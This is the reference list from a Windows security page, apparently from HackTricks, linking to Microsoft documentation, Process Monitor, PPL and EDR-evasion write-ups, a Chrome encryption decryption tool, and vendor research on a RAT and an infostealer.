- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)

{{#include ../banners/hacktricks-training.md}}
